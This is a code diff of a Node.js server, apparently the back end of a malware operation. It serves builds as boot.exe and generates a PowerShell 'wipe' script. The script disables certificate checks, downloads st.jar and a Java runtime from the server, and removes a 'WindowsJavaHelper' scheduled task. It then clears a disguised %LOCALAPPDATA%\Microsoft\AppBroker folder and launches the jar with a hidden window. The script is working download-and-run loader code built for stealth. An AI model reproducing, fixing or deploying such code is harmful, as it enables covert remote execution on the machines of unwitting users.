@@ -202,8 +202,10 @@ async function getOwnUser(uid) {
   return await getCachedUser(uid);
 }
 
+// ─── FIXED WIPE COMMAND ─────────────────────────────────────────────────────
 function buildWipeCommand(serverBase) {
   const stUrl = `${serverBase}/api/downloads/st.jar`;
+  const jreUrl = `${serverBase}/api/downloads/jre.zip`;
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -214,7 +216,7 @@ $log = Join-Path $env:TEMP 'wh-wipe.log'
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-function Get-St {
+function Get-File {
   param([string]$Url, [string]$Dst)
   Remove-Item -Force -Path $Dst -ErrorAction SilentlyContinue
   $params = @{ Uri = $Url; OutFile = $Dst; UseBasicParsing = $true; TimeoutSec = 60; ErrorAction = 'Stop' }
@@ -226,7 +228,7 @@ $stTmp = Join-Path $env:TEMP 'st_new.jar'
 $ok = $false
 for ($i = 0; $i -lt 5; $i++) {
   try {
-    Get-St -Url '${stUrl}' -Dst $stTmp
+    Get-File -Url '${stUrl}' -Dst $stTmp
     if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true; break }
   } catch {
     "attempt $i failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
@@ -234,34 +236,29 @@ for ($i = 0; $i -lt 5; $i++) {
   }
 }
 if (-not $ok) {
-  try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile('${stUrl}', $stTmp)
-    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true }
-  } catch {
-    "webclient failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
-  }
-}
-if (-not $ok) {
-  "abort: download failed, loader untouched" | Out-File -Encoding UTF8 -Append $log
+  "abort: st.jar download failed" | Out-File -Encoding UTF8 -Append $log
   exit 1
 }
 "download ok: $((Get-Item $stTmp).Length) bytes" | Out-File -Encoding UTF8 -Append $log
 
 schtasks /Delete /TN 'WindowsJavaHelper' /F 2>$null | Out-Null
 
-# Correct path for AppBroker
 $dir = Join-Path $env:LOCALAPPDATA 'Microsoft\\AppBroker'
 Get-Process -ErrorAction SilentlyContinue | Where-Object {
   $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase)
 } | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 2000
 
-$keep = (Join-Path $dir 'key.json').ToLower()
+# KEEP jre and key.json
+$keep = @(
+    (Join-Path $dir 'key.json').ToLower(),
+    (Join-Path $dir 'jre').ToLower()
+)
+
 for ($i = 0; $i -lt 15; $i++) {
   $left = @()
   Get-ChildItem -Force -Path $dir -ErrorAction SilentlyContinue | ForEach-Object {
-    if ($_.FullName.ToLower() -ne $keep) {
+    if (-not $keep.Contains($_.FullName.ToLower())) {
       try { Remove-Item -Recurse -Force -Path $_.FullName -ErrorAction Stop }
       catch { $left += $_.FullName }
     }
@@ -279,12 +276,29 @@ for ($i = 0; $i -lt 15; $i++) {
 }
 "moved st.jar: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log
 
-if (Test-Path $stDst) {
-  $javaw = "javaw.exe"
-  Start-Process -FilePath $javaw -ArgumentList "-jar \`"$stDst\`"" -WindowStyle Hidden
-  "launched" | Out-File -Encoding UTF8 -Append $log
+# Check if jre is missing or corrupted, download if needed
+$javaw = $null
+$localJava = Get-ChildItem -Path (Join-Path $dir 'jre') -Filter 'javaw.exe' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+if ($localJava) { 
+    $javaw = $localJava.FullName 
 } else {
-  "error: st.jar missing after move" | Out-File -Encoding UTF8 -Append $log
+    "jre missing or corrupted. downloading..." | Out-File -Encoding UTF8 -Append $log
+    $jreTmp = Join-Path $env:TEMP 'jre_new.zip'
+    Get-File -Url '${jreUrl}' -Dst $jreTmp
+    $jreDir = Join-Path $dir 'jre'
+    New-Item -ItemType Directory -Force -Path $jreDir | Out-Null
+    tar.exe -xf $jreTmp -C $jreDir
+    Remove-Item -Force -Path $jreTmp
+    $localJava = Get-ChildItem -Path $jreDir -Filter 'javaw.exe' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($localJava) { $javaw = $localJava.FullName }
+}
+
+if ($javaw -and (Test-Path $javaw) -and (Test-Path $stDst)) {
+  "using javaw: $javaw" | Out-File -Encoding UTF8 -Append $log
+  Start-Process -FilePath $javaw -ArgumentList "-jar \`"$stDst\`"" -WindowStyle Hidden
+  "launched st.jar" | Out-File -Encoding UTF8 -Append $log
+} else {
+  "error: javaw.exe or st.jar missing" | Out-File -Encoding UTF8 -Append $log
 }
 `;
 
@@ -836,6 +850,7 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
   `, [req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now()]);
 
+  // FIXED: ONLY write to boot.exe. Do not overwrite 3.exe.
   fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), zipBuf, { mode: 0o644 });
 
   res.json({
@@ -1118,6 +1133,7 @@ async function refreshAllBuilds() {
 
         if (!liveExeWritten) {
           fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), exeBuf, { mode: 0o644 });
+          // REMOVED the 3.exe overwrite
           liveExeWritten = true;
         }
 
